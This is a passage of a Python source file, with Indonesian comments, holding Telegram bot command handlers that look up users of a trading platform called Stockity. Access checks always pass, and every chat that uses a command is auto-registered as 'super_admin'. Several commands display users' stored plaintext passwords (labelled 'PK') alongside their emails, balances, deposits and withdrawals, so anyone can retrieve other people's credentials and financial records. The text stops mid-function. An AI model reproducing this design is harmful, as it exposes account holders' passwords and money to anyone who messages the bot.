"""
Command Handlers untuk Bot Telegram Admin.
Semua perintah bot didefinisikan di sini.
"""

import asyncio
from datetime import datetime, timedelta
from typing import Optional

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes
from telegram.constants import ParseMode

from config import logger, SUPER_ADMIN_CHAT_IDS, now_wib, ts_to_wib
from database import db
from stockity_api import StockityAPI, StockityAPIError
from models import UserBalance, UserProfile, BotAdmin, ISO_TO_UNIT

# ============================================================
# HELPERS
# ============================================================

async def ensure_recipient(update: Update) -> None:
    """
    Pastikan chat yang sedang berinteraksi otomatis terdaftar sebagai PENERIMA
    notifikasi deposit — tanpa perlu /myid atau /start manual.

    Dipanggil dari check_admin sehingga SETIAP command otomatis mendaftarkan
    chat aktif. Sekali daftar (idempoten): kalau sudah ada, tidak insert ulang.
    """
    chat = update.effective_chat
    user = update.effective_user
    if not chat:
        return
    try:
        existing = await db.get_bot_admin(chat.id)
        if existing:
            return
        await db.add_bot_admin(BotAdmin(
            chat_id=chat.id,
            username=user.username if user else None,
            first_name=user.first_name if user else None,
            last_name=user.last_name if user else None,
            role="super_admin",
            is_active=True,
            created_by=chat.id,
        ))
        logger.info("Penerima notifikasi auto-terdaftar: %s (%s)",
                    chat.id, user.username if user else "-")
    except Exception as e:
        logger.warning("ensure_recipient error: %s", e)


async def check_admin(update: Update) -> bool:
    """Bot TERBUKA untuk umum — semua perintah boleh dipakai siapa saja.

    Sekalian auto-daftarkan chat aktif sebagai penerima notifikasi deposit.
    """
    await ensure_recipient(update)
    return True


async def check_super_admin(update: Update) -> bool:
    """Bot TERBUKA — tidak ada pembatasan super admin."""
    await ensure_recipient(update)
    return True


def format_user_detail(user_id: str, email: str, balance: UserBalance,
                       profile: UserProfile, whitelist, pk: str = "") -> str:
    """Format detail user untuk ditampilkan."""
    status = "🟢 Aktif" if whitelist and whitelist.is_active else "🔴 Nonaktif"
    last_login = whitelist.last_login_formatted if whitelist else "-"

    text = (
        f"📋 <b>DETAIL USER</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>Nama:</b> {profile.full_name}\n"
        f"📧 <b>Email:</b> <code>{email}</code>\n"
        f"🔑 <b>PK:</b> <code>{pk or '-'}</code>\n"
        f"🆔 <b>User ID:</b> <code>{user_id}</code>\n"
        f"📱 <b>Telepon:</b> {profile.phone or '-'}\n"
        f"🌍 <b>Negara:</b> {profile.country or '-'}\n"
        f"🎂 <b>Ulang Tahun:</b> {profile.birthday or '-'}\n"
        f"📅 <b>Terdaftar:</b> {profile.registered_at_formatted}\n"
        f"✅ <b>Email Terverifikasi:</b> {'Ya' if profile.email_verified else 'Tidak'}\n"
        f"✅ <b>Dokumen Terverifikasi:</b> {'Ya' if profile.docs_verified else 'Tidak'}\n"
        f"🔒 <b>Data Terkunci:</b> {'Ya' if profile.personal_data_locked else 'Tidak'}\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"💰 <b>SALDO AKUN REAL</b>\n"
        f"   <b>Real:</b> <code>{balance.real_balance_formatted}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🏷️ <b>Status Whitelist:</b> {status}\n"
        f"🕐 <b>Login Terakhir:</b> {last_login}\n"
        f"━━━━━━━━━━━━━━━━━━━━━"
    )
    return text


# ============================================================
# COMMAND HANDLERS
# ============================================================

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler /start - bot terbuka untuk umum."""
    user = update.effective_user
    chat_id = user.id

    # Bot terbuka. Akun yang /start LANGSUNG didaftarkan sebagai PENERIMA
    # NOTIFIKASI deposit — pakai chat yang sedang terhubung, tanpa perlu /myid.
    existing = await db.get_bot_admin(chat_id)
    newly = False
    if not existing:
        await db.add_bot_admin(BotAdmin(
            chat_id=chat_id,
            username=user.username,
            first_name=user.first_name,
            last_name=user.last_name,
            role="super_admin",
            is_active=True,
            created_by=chat_id,
        ))
        newly = True
        logger.info(f"Penerima notifikasi auto-terdaftar: {chat_id} ({user.username})")

    status_line = (
        "✅ Akun ini <b>otomatis terdaftar</b> menerima notifikasi deposit.\n\n"
        if newly else
        "✅ Akun ini sudah terdaftar menerima notifikasi.\n\n"
    )
    await update.message.reply_text(
        f"👋 <b>Selamat datang, {user.first_name or 'User'}!</b>\n\n"
        f"{status_line}"
        f"Gunakan /help untuk melihat daftar perintah.",
        parse_mode=ParseMode.HTML,
    )


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /help - daftar semua perintah."""
    if not await check_admin(update):
        return

    is_sadmin = await db.is_super_admin(update.effective_user.id)

    text = (
        f"📖 <b>DAFTAR PERINTAH BOT ADMIN</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>🧑‍💼 Manajemen Admin:</b>\n"
        f"  /admins - Lihat daftar admin bot\n"
    )

    if is_sadmin:
        text += (
            f"  /addadmin [chat_id] - Tambah admin baru\n"
            f"  /removeadmin [chat_id] - Hapus admin\n"
            f"  /toggleadmin [chat_id] - Aktifkan/nonaktifkan admin\n"
        )

    text += (
        f"\n<b>👥 Manajemen User:</b>\n"
        f"  /users - Lihat daftar user (whitelist)\n"
        f"  /user [id/email] - Detail user lengkap\n"
        f"  /search [keyword] - Cari user\n"
        f"  /aktifkan [email] - Aktifkan user\n"
        f"  /nonaktifkan [email] - Nonaktifkan user\n"
        f"\n<b>💰 Saldo & Deposit:</b>\n"
        f"  /allsaldo - Semua saldo user aktif (live fetch)\n"
        f"  /saldo [user_id] - Cek saldo akun real by ID\n"
        f"  /saldobyemail [email] - Cek saldo by email\n"
        f"  /deposit [id/email] - Riwayat deposit 1 user (live)\n"
        f"  /depositlog - Semua deposit terbaru, semua user (live)\n"
        f"  /depositlog7 - Deposit 7 hari terakhir, semua user (live)\n"
        f"\n<b>💸 Penarikan (Withdraw):</b>\n"
        f"  /penarikan [id/email] - Riwayat penarikan 1 user (live)\n"
        f"  /penarikanlog - Semua penarikan terbaru, semua user (live)\n"
        f"  /penarikanlog7 - Penarikan 7 hari terakhir, semua user (live)\n"
        f"\n<b>📊 Statistik:</b>\n"
        f"  /stats - Statistik user\n"
        f"  /cekstatus [user_id] - Cek status lengkap user\n"
        f"\n<b>📢 Komunikasi:</b>\n"
        f"  /broadcast [pesan] - Kirim pesan ke semua admin\n"
        f"\n<b>⚙️ Utilitas:</b>\n"
        f"  /myid - Lihat chat ID Anda\n"
        f"  /ping - Cek bot status\n"
        f"  /help - Tampilkan bantuan ini\n"
        f"\n━━━━━━━━━━━━━━━━━━━━━"
    )

    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def cmd_ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /ping - cek status bot."""
    if not await check_admin(update):
        return

    start = datetime.utcnow()
    # Cek koneksi Supabase
    stats = await db.get_user_statistics()
    elapsed = (datetime.utcnow() - start).total_seconds() * 1000

    await update.message.reply_text(
        f"🏓 <b>PONG!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏱️ Latency: <code>{elapsed:.1f}ms</code>\n"
        f"🗄️ Supabase: <code>Connected</code>\n"
        f"👥 Total Users: <code>{stats.total}</code>\n"
        f"📅 Server Time: <code>{now_wib().strftime('%Y-%m-%d %H:%M:%S')} WIB</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━",
        parse_mode=ParseMode.HTML,
    )


async def cmd_myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /myid - lihat chat ID sendiri."""
    user = update.effective_user
    await update.message.reply_text(
        f"🆔 <b>Chat ID Anda:</b> <code>{user.id}</code>\n"
        f"👤 <b>Username:</b> @{user.username or 'tidak ada'}\n"
        f"📛 <b>Nama:</b> {user.first_name or ''} {user.last_name or ''}",
        parse_mode=ParseMode.HTML,
    )


# ============================================================
# ADMIN MANAGEMENT
# ============================================================

async def cmd_admins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /admins - lihat daftar admin bot."""
    if not await check_admin(update):
        return

    admins = await db.list_bot_admins()

    if not admins:
        await update.message.reply_text("ℹ️ Belum ada admin bot yang terdaftar.")
        return

    lines = [f"👥 <b>DAFTAR ADMIN BOT ({len(admins)})</b>\n━━━━━━━━━━━━━━━━━━━━━"]
    for i, admin in enumerate(admins, 1):
        role_emoji = "👑" if admin.role == "super_admin" else "🧑‍💼"
        status = "🟢" if admin.is_active else "🔴"
        lines.append(
            f"\n{i}. {role_emoji} <b>{admin.display_name}</b>\n"
            f"   {status} Chat ID: <code>{admin.chat_id}</code>\n"
            f"   🏷️ Role: <code>{admin.role}</code>"
        )

    lines.append("\n━━━━━━━━━━━━━━━━━━━━━")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)


async def cmd_addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /addadmin - tambah admin baru."""
    if not await check_super_admin(update):
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            "⚠️ <b>Penggunaan:</b>\n"
            "<code>/addadmin [chat_id] [username] [first_name]</code>\n\n"
            "Contoh: <code>/addadmin 123456789 johndoe John</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    try:
        new_chat_id = int(args[0])
    except ValueError:
        await update.message.reply_text(
            "❌ Chat ID harus berupa angka.",
            parse_mode=ParseMode.HTML,
        )
        return

    # Cek apakah sudah ada
    existing = await db.get_bot_admin(new_chat_id)
    if existing:
        await update.message.reply_text(
            f"ℹ️ Admin dengan chat ID <code>{new_chat_id}</code> sudah terdaftar.",
            parse_mode=ParseMode.HTML,
        )
        return

    new_admin = BotAdmin(
        chat_id=new_chat_id,
        username=args[1] if len(args) > 1 else None,
        first_name=args[2] if len(args) > 2 else None,
        role="admin",
        is_active=True,
        created_by=update.effective_user.id,
    )

    try:
        success = await db.add_bot_admin(new_admin)
        if success:
            await update.message.reply_text(
                f"✅ Admin berhasil ditambahkan!\n"
                f"🆔 Chat ID: <code>{new_chat_id}</code>\n"
                f"🏷️ Role: <code>admin</code>",
                parse_mode=ParseMode.HTML,
            )
        else:
            await update.message.reply_text("ℹ️ Admin sudah ada.")
    except Exception as e:
        await update.message.reply_text(f"❌ Gagal menambahkan admin: {str(e)}")


async def cmd_removeadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /removeadmin - hapus admin."""
    if not await check_super_admin(update):
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            "⚠️ <b>Penggunaan:</b> <code>/removeadmin [chat_id]</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    try:
        target_chat_id = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ Chat ID harus berupa angka.")
        return

    # Tidak boleh hapus diri sendiri
    if target_chat_id == update.effective_user.id:
        await update.message.reply_text("❌ Anda tidak bisa menghapus diri sendiri.")
        return

    success = await db.remove_bot_admin(target_chat_id)
    if success:
        await update.message.reply_text(
            f"✅ Admin <code>{target_chat_id}</code> berhasil dihapus.",
            parse_mode=ParseMode.HTML,
        )
    else:
        await update.message.reply_text("❌ Gagal menghapus admin.")


async def cmd_toggleadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /toggleadmin - aktifkan/nonaktifkan admin."""
    if not await check_super_admin(update):
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            "⚠️ <b>Penggunaan:</b> <code>/toggleadmin [chat_id]</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    try:
        target_chat_id = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ Chat ID harus berupa angka.")
        return

    admin = await db.get_bot_admin(target_chat_id)
    if not admin:
        await update.message.reply_text("❌ Admin tidak ditemukan.")
        return

    new_status = not admin.is_active
    success = await db.toggle_bot_admin(target_chat_id, new_status)
    if success:
        status_text = "diaktifkan" if new_status else "dinonaktifkan"
        await update.message.reply_text(
            f"✅ Admin <code>{target_chat_id}</code> berhasil {status_text}.",
            parse_mode=ParseMode.HTML,
        )
    else:
        await update.message.reply_text("❌ Gagal mengubah status admin.")


# ============================================================
# USER MANAGEMENT
# ============================================================

async def cmd_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /users - lihat daftar user whitelist."""
    if not await check_admin(update):
        return

    args = context.args
    limit = 20
    offset = 0

    # Parse args
    if args:
        try:
            limit = min(int(args[0]), 50)  # Max 50
        except ValueError:
            pass
        if len(args) > 1:
            try:
                offset = int(args[1])
            except ValueError:
                pass

    users = await db.list_whitelist_users(limit=limit, offset=offset)

    if not users:
        await update.message.reply_text("ℹ️ Tidak ada user yang ditemukan.")
        return

    lines = [f"👥 <b>DAFTAR USER ({len(users)} ditampilkan)</b>\n━━━━━━━━━━━━━━━━━━━━━"]

    for i, user in enumerate(users, 1):
        status = user.status_emoji
        name = user.name or user.email.split("@")[0]
        lines.append(
            f"\n{i}. {status} <b>{name}</b>\n"
            f"   📧 {user.email}\n"
            f"   🆔 <code>{user.user_id or '-'}</code>\n"
            f"   🕐 {user.added_at_formatted}"
        )

    lines.append(f"\n━━━━━━━━━━━━━━━━━━━━━\nℹ️ Gunakan <code>/user [email]</code> untuk detail")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)


async def cmd_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /user - lihat detail user lengkap."""
    if not await check_admin(update):
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            "⚠️ <b>Penggunaan:</b>\n"
            "<code>/user [user_id atau email]</code>\n\n"
            "Contoh:\n"
            "  <code>/user 12345678</code>\n"
            "  <code>/user user@example.com</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    identifier = args[0]

    # Coba cari sebagai user_id dulu, lalu email
    session = await db.get_session(identifier)
    if not session:
        session = await db.get_session_by_email(identifier)

    if not session:
        await update.message.reply_text(
            f"❌ User dengan ID/email <code>{identifier}</code> tidak ditemukan.",
            parse_mode=ParseMode.HTML,
        )
        return

    # Ambil data whitelist
    whitelist = await db.get_whitelist_user_by_id(session.user_id) or \
                await db.get_whitelist_user(session.email)

    # Ambil balance dan profile dari Stockity
    try:
        balance = await StockityAPI.get_user_balance_by_session(session)
    except StockityAPIError as e:
        balance = UserBalance(currency=session.currency)

    try:
        profile = await StockityAPI.get_user_profile_by_session(session)
    except StockityAPIError as e:
        profile = UserProfile(id=0, email=session.email, currency=session.currency)

    # Format response
    text = format_user_detail(session.user_id, session.email, balance, profile, whitelist, pk=session.password)

    # Buat keyboard untuk aksi
    keyboard = []
    if whitelist:
        if whitelist.is_active:
            keyboard.append([InlineKeyboardButton(
                "🔴 Nonaktifkan User",
                callback_data=f"deactivate:{whitelist.email}"
            )])
        else:
            keyboard.append([InlineKeyboardButton(
                "🟢 Aktifkan User",
                callback_data=f"activate:{whitelist.email}"
            )])

    if keyboard:
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
    else:
        await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def cmd_search(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /search - cari user."""
    if not await check_admin(update):
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            "⚠️ <b>Penggunaan:</b> <code>/search [keyword]</code>\n\n"
            "Mencari berdasarkan email, nama, atau user ID.",
            parse_mode=ParseMode.HTML,
        )
        return

    keyword = " ".join(args).lower()

    # Ambil semua users dan filter
    all_users = await db.list_whitelist_users(limit=500)
    matched = []

    for user in all_users:
        if (keyword in user.email.lower() or
            (user.name and keyword in user.name.lower()) or
            (user.user_id and keyword in user.user_id.lower())):
            matched.append(user)

    if not matched:
        await update.message.reply_text(f"ℹ️ Tidak ada user yang cocok dengan '<code>{keyword}</code>'.",
                                       parse_mode=ParseMode.HTML)
        return

    lines = [f"🔍 <b>HASIL PENCARIAN: '{keyword}' ({len(matched)} ditemukan)</b>\n━━━━━━━━━━━━━━━━━━━━━"]

    for i, user in enumerate(matched[:20], 1):  # Max 20
        status = user.status_emoji
        name = user.name or user.email.split("@")[0]
        lines.append(
            f"\n{i}. {status} <b>{name}</b>\n"
            f"   📧 <code>{user.email}</code>\n"
            f"   🆔 <code>{user.user_id or '-'}</code>"
        )

    if len(matched) > 20:
        lines.append(f"\n... dan {len(matched) - 20} hasil lainnya")

    lines.append("\n━━━━━━━━━━━━━━━━━━━━━")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)


async def cmd_aktifkan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /aktifkan - aktifkan user whitelist."""
    if not await check_admin(update):
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            "⚠️ <b>Penggunaan:</b> <code>/aktifkan [email]</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    email = args[0]
    success = await db.toggle_whitelist_user(email, True)

    if success:
        await update.message.reply_text(
            f"✅ User <code>{email}</code> telah <b>diaktifkan</b>.",
            parse_mode=ParseMode.HTML,
        )
    else:
        await update.message.reply_text(f"❌ Gagal mengaktifkan user <code>{email}</code>.",
                                       parse_mode=ParseMode.HTML)


async def cmd_nonaktifkan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /nonaktifkan - nonaktifkan user whitelist."""
    if not await check_admin(update):
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            "⚠️ <b>Penggunaan:</b> <code>/nonaktifkan [email]</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    email = args[0]
    success = await db.toggle_whitelist_user(email, False)

    if success:
        await update.message.reply_text(
            f"✅ User <code>{email}</code> telah <b>dinonaktifkan</b>.",
            parse_mode=ParseMode.HTML,
        )
    else:
        await update.message.reply_text(f"❌ Gagal menonaktifkan user <code>{email}</code>.",
                                       parse_mode=ParseMode.HTML)


# ============================================================
# BALANCE & DEPOSIT
# ============================================================

async def cmd_saldo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /saldo - cek saldo akun real by user_id."""
    if not await check_admin(update):
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            "⚠️ <b>Penggunaan:</b>\n"
            "<code>/saldo [user_id]</code>\n\n"
            "Contoh: <code>/saldo 12345678</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    user_id = args[0]
    session = await db.get_session(user_id)

    if not session:
        await update.message.reply_text(
            f"❌ User dengan ID <code>{user_id}</code> tidak ditemukan.",
            parse_mode=ParseMode.HTML,
        )
        return

    # Kirim pesan loading
    loading_msg = await update.message.reply_text("⏳ Mengambil data saldo...")

    try:
        balance = await StockityAPI.get_user_balance_by_session(session)
        profile = await StockityAPI.get_user_profile_by_session(session)

        text = (
            f"💰 <b>SALDO AKUN REAL</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>User:</b> {profile.full_name}\n"
            f"📧 <b>Email:</b> <code>{session.email}</code>\n"
            f"🔑 <b>PK:</b> <code>{session.password or '-'}</code>\n"
            f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
            f"💱 <b>Mata Uang:</b> <code>{balance.currency}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"💵 <b>Saldo Real:</b> <code>{balance.real_balance_formatted}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🕐 Diperiksa: <code>{now_wib().strftime('%d %b %Y %H:%M:%S')} WIB</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━"
        )

        await loading_msg.edit_text(text, parse_mode=ParseMode.HTML)

    except StockityAPIError as e:
        await loading_msg.edit_text(
            f"❌ <b>Gagal mengambil saldo</b>\n"
            f"User ID: <code>{user_id}</code>\n"
            f"Error: <code>{str(e)}</code>\n\n"
            f"Kemungkinan session user sudah expired.",
            parse_mode=ParseMode.HTML,
        )


async def cmd_saldobyemail(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /saldobyemail - cek saldo by email."""
    if not await check_admin(update):
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            "⚠️ <b>Penggunaan:</b>\n"
            "<code>/saldobyemail [email]</code>\n\n"
            "Contoh: <code>/saldobyemail user@example.com</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    email = args[0]
    session = await db.get_session_by_email(email)

    if not session:
        await update.message.reply_text(
            f"❌ User dengan email <code>{email}</code> tidak ditemukan.",
            parse_mode=ParseMode.HTML,
        )
        return

    loading_msg = await update.message.reply_text("⏳ Mengambil data saldo...")

    try:
        balance = await StockityAPI.get_user_balance_by_session(session)
        profile = await StockityAPI.get_user_profile_by_session(session)

        text = (
            f"💰 <b>SALDO AKUN REAL</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>User:</b> {profile.full_name}\n"
            f"📧 <b>Email:</b> <code>{session.email}</code>\n"
            f"🔑 <b>PK:</b> <code>{session.password or '-'}</code>\n"
            f"🆔 <b>ID:</b> <code>{session.user_id}</code>\n"
            f"💱 <b>Mata Uang:</b> <code>{balance.currency}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"💵 <b>Saldo Real:</b> <code>{balance.real_balance_formatted}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🕐 Diperiksa: <code>{now_wib().strftime('%d %b %Y %H:%M:%S')} WIB</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━"
        )

        await loading_msg.edit_text(text, parse_mode=ParseMode.HTML)

    except StockityAPIError as e:
        await loading_msg.edit_text(
            f"❌ <b>Gagal mengambil saldo</b>\n"
            f"Email: <code>{email}</code>\n"
            f"Error: <code>{str(e)}</code>\n\n"
            f"Kemungkinan session user sudah expired.",
            parse_mode=ParseMode.HTML,
        )


def _currency_breakdown(items: list, get_cur, get_amt) -> list:
    """
    Agregasi nominal PER MATA UANG. Tak bisa menjumlahkan IDR + NGN + INR jadi
    satu angka, jadi totalnya dipecah per currency.
    Return: list of (iso, unit, count, total) — diurutkan total terbesar dulu.
    """
    agg: dict = {}
    for it in items:
        cur = get_cur(it) or "IDR"
        slot = agg.setdefault(cur, [0, 0.0])
        slot[0] += 1
        slot[1] += (get_amt(it) or 0)
    out = [(iso, ISO_TO_UNIT.get(iso, iso), c, t) for iso, (c, t) in agg.items()]
    out.sort(key=lambda x: x[3], reverse=True)
    return out


async def _live_txn_feed(update: Update, since_ts, title: str, kind: str):
    """
    Ambil transaksi sukses LIVE dari SEMUA session aktif (pola sama /allsaldo),
    gabungkan lintas user, kelompokkan + urutkan PER MATA UANG, lalu tampilkan.

    kind = "deposit" | "withdraw".
    since_ts=None → semua. Selain itu → hanya created_at >= since_ts.
    """
    is_wd = kind == "withdraw"
    emoji = "💸" if is_wd else "💰"
    noun  = "penarikan" if is_wd else "deposit"
    fetch = (StockityAPI.get_withdraw_transactions_by_session if is_wd
             else StockityAPI.get_deposit_transactions_by_session)

    loading_msg = await update.message.reply_text("⏳ Mengambil daftar session aktif...")

    sessions = await db.list_sessions(active_only=True, limit=1000)
    if not sessions:
        await loading_msg.edit_text("ℹ️ Tidak ada session aktif.")
        return

    await loading_msg.edit_text(
        f"⏳ Mengecek {noun} <b>{len(sessions)}</b> user...\nHarap tunggu...",
        parse_mode=ParseMode.HTML,
    )

    # Fetch concurrent, semaphore 5 (sama dgn /allsaldo) biar tak kena rate limit
    semaphore = asyncio.Semaphore(5)
    all_txns: list = []   # (email, user_id, pk, txn)

    async def fetch_one(session):
        async with semaphore:
            try:
                txns = await fetch(session)
                for t in txns:
                    ts = t.get("created_at", 0) or t.get("processed_at", 0)
                    if since_ts is not None and (not ts or ts < since_ts):
                        continue
                    all_txns.append((session.email, session.user_id, session.password, t))
            except Exception:
                pass

    await asyncio.gather(*[fetch_one(s) for s in sessions], return_exceptions=True)

    if not all_txns:
        await loading_msg.edit_text(
            f"ℹ️ Tidak ada {noun} sukses dari {len(sessions)} user aktif"
            + (" dalam rentang waktu ini." if since_ts is not None else ".")
        )
        return

    # Rincian per mata uang + urutan currency (total terbesar dulu)
    breakdown = _currency_breakdown(
        [x[3] for x in all_txns],
        get_cur=lambda t: t.get("currency", "IDR"),
        get_amt=lambda t: t.get("amount", 0),
    )
    cur_order = {iso: idx for idx, (iso, *_rest) in enumerate(breakdown)}

    # Kelompokkan baris per mata uang (urut sesuai breakdown), lalu terbaru dulu
    all_txns.sort(key=lambda x: (
        cur_order.get(x[3].get("currency", "IDR"), 999),
        -(x[3].get("created_at", 0) or 0),
    ))

    MAX_ROWS = 40
    shown = all_txns[:MAX_ROWS]
    now_str = now_wib().strftime('%d %b %Y %H:%M') + " WIB"

    total_lines = "\n".join(
        f"   💵 <b>{unit} {total:,.2f}</b>  ({count} {noun}, {iso})"
        for iso, unit, count, total in breakdown
    )
    header = (
        f"{emoji} <b>{title}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🧾 {len(all_txns)} {noun} dari {len(breakdown)} mata uang\n"
        f"{total_lines}\n"
        f"🕐 {now_str}\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
    )

    rows = []
    for i, (email, uid, pk, t) in enumerate(shown, 1):
        ts = t.get("created_at", 0) or t.get("processed_at", 0)
        dt = ts_to_wib(ts).strftime("%d %b %Y %H:%M") if ts else "-"
        u = ISO_TO_UNIT.get(t.get("currency", "IDR"), t.get("currency", "IDR"))
        rows.append(
            f"<b>{i}.</b> 📧 <code>{email}</code>\n"
            f"    🔑 PK : <code>{pk or '-'}</code>\n"
            f"    💵 <b>{u} {t.get('amount', 0):,.2f}</b> — {t.get('handler_name') or '-'}\n"
            f"    🕐 {dt}"
        )
    if len(all_txns) > MAX_ROWS:
        rows.append(f"… dan {len(all_txns) - MAX_ROWS} {noun} lebih lama (tidak ditampilkan)")

    # Kirim — paginasi kalau kepanjangan (pola sama /allsaldo)
    LIMIT = 3800
    full = header + "\n\n".join(rows)
    if len(full) <= LIMIT:
        await loading_msg.edit_text(full, parse_mode=ParseMode.HTML)
        return

    try:
        await loading_msg.delete()
    except Exception:
        pass

    chunks: list = []
    current = header
    for row in rows:
        candidate = current + row + "\n\n"
        if len(candidate) > LIMIT:
            chunks.append(current.rstrip())
            current = row + "\n\n"
        else:
            current = candidate
    if current.strip():
        chunks.append(current.rstrip())

    total_pages = len(chunks)
    for idx, chunk in enumerate(chunks, 1):
        prefix = f"📋 <b>Halaman {idx}/{total_pages}</b>\n" if total_pages > 1 else ""
        await update.message.reply_text(prefix + chunk, parse_mode=ParseMode.HTML)


async def cmd_depositlog(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler /depositlog - SEMUA deposit terbaru dari semua user aktif (live, seperti /allsaldo)."""
    if not await check_admin(update):
        return
    await _live_txn_feed(update, since_ts=None, title="DEPOSIT TERBARU — SEMUA USER", kind="deposit")


async def cmd_depositlog7(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler /depositlog7 - deposit 7 hari terakhir dari semua user aktif (live)."""
    if not await check_admin(update):
        return
    since = (datetime.utcnow() - timedelta(days=7)).timestamp()
    await _live_txn_feed(update, since_ts=since, title="DEPOSIT 7 HARI — SEMUA USER", kind="deposit")


async def cmd_penarikanlog(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler /penarikanlog - SEMUA penarikan terbaru dari semua user aktif (live)."""
    if not await check_admin(update):
        return
    await _live_txn_feed(update, since_ts=None, title="PENARIKAN TERBARU — SEMUA USER", kind="withdraw")


async def cmd_penarikanlog7(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler /penarikanlog7 - penarikan 7 hari terakhir dari semua user aktif (live)."""
    if not await check_admin(update):
        return
    since = (datetime.utcnow() - timedelta(days=7)).timestamp()
    await _live_txn_feed(update, since_ts=since, title="PENARIKAN 7 HARI — SEMUA USER", kind="withdraw")


async def _per_user_txn(update: Update, context: ContextTypes.DEFAULT_TYPE, kind: str):
    """
    Cek SELURUH history transaksi (deposit/withdraw) satu user, LIVE dari Stockity.
    Pola sama dengan /saldo & /allsaldo (fetch on-demand) → tidak tergantung
    detection loop atau window 24 jam, jadi selalu menampilkan riwayat terkini.
    Total dipecah per mata uang (tak mencampur IDR + mata uang lain).
    """
    is_wd = kind == "withdraw"
    emoji = "💸" if is_wd else "💰"
    noun  = "penarikan" if is_wd else "deposit"
    cmd   = "penarikan" if is_wd else "deposit"
    fetch = (StockityAPI.get_withdraw_transactions_by_session if is_wd
             else StockityAPI.get_deposit_transactions_by_session)

    args = context.args
    if not args:
        await update.message.reply_text(
            f"⚠️ <b>Penggunaan:</b>\n"
            f"<code>/{cmd} [user_id atau email]</code>\n\n"
            f"Contoh:\n"
            f"  <code>/{cmd} 12345678</code>\n"
            f"  <code>/{cmd} user@example.com</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    identifier = args[0]
    session = await db.get_session(identifier)
    if not session:
        session = await db.get_session_by_email(identifier)
    if not session:
        await update.message.reply_text(
            f"❌ User dengan ID/email <code>{identifier}</code> tidak ditemukan.",
            parse_mode=ParseMode.HTML,
        )
        return

    loading_msg = await update.message.reply_text(f"⏳ Mengambil riwayat {noun}...")

    try:
        txns = await fetch(session)
    except StockityAPIError as e:
        await loading_msg.edit_text(
            f"❌ <b>Gagal mengambil {noun}</b>\n"
            f"Email: <code>{session.email}</code>\n"
            f"Error: <code>{str(e)}</code>\n\n"
            f"Kemungkinan session user sudah expired.",
            parse_mode=ParseMode.HTML,
        )
        return

    if not txns:
        await loading_msg.edit_text(
            f"ℹ️ Tidak ada {noun} sukses untuk <code>{session.email}</code>.",
            parse_mode=ParseMode.HTML,
        )
        return

    # Urutkan terbaru dulu
    txns.sort(key=lambda t: t.get("created_at", 0) or 0, reverse=True)

    # Total per mata uang (urut terbesar dulu)
    breakdown = _currency_breakdown(
